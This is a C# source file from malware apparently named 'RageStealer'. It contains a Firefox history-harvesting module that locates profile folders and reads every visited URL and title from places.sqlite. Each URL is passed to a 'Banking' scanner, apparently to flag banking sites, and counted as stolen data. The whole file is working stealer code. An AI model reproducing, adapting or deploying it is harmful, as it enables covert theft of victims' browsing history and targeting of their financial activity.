using System;
using System.Collections.Generic;
using System.IO;
using RageStealer.Helper;
using RageStealer.Helpers;
using RageStealer.Target.Browsers.Chromium;

namespace RageStealer.Target.Browsers.Firefox;

internal class CHistory
{
	private static string GetHistoryDbPath(string path)
	{
		try
		{
			string path2 = path + "\\Profiles";
			if (Directory.Exists(path2))
			{
				string[] directories = Directory.GetDirectories(path2);
				foreach (string text in directories)
				{
					if (File.Exists(text + "\\places.sqlite"))
					{
						return text + "\\places.sqlite";
					}
				}
			}
		}
		catch (Exception)
		{
		}
		return null;
	}

	public static List<Site> Get(string path)
	{
		List<Site> list = new List<Site>();
		try
		{
			SqLite sqLite = SqlReader.ReadTable(GetHistoryDbPath(path), "moz_places");
			if (sqLite == null)
			{
				return list;
			}
			for (int i = 0; i < sqLite.GetRowCount(); i++)
			{
				Site site = default(Site);
				site.Title = RageStealer.Target.Browsers.Chromium.Crypto.GetUtf8(sqLite.GetValue(i, 2));
				site.Url = RageStealer.Target.Browsers.Chromium.Crypto.GetUtf8(sqLite.GetValue(i, 1));
				site.Count = Convert.ToInt32(sqLite.GetValue(i, 4)) + 1;
				Site item = site;
				if (!(item.Title == "0"))
				{
					list.Add(item);
					Banking.ScanData(item.Url);
					Counter.History++;
				}
			}
		}
		catch (Exception)
		{
		}
		return list;
	}
}
